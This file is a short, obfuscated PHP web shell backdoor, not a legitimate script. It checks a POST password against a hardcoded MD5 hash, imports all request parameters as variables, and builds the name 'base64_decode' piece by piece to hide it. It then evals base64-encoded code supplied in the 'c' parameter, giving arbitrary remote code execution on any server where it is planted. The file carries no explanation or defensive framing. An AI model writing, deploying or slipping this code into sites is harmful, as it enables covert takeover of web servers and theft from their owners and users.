<?php
if(!isset($_POST['upw']) || md5($_POST['upw'])!='ec17953aa2d2b2f9046beeacae3e459e') exit;
$_REQUEST = array_merge($_GET,$_POST);foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}} $c=isset($c) ? $c:'';
$e='code';$a='ba';$z='_';$a.='se';$b=(100-36);$d='de';$a=$a.$b.$z.$d.$e;eval(((strlen($c)>10) ? $a($c) : "echo '';"));
?>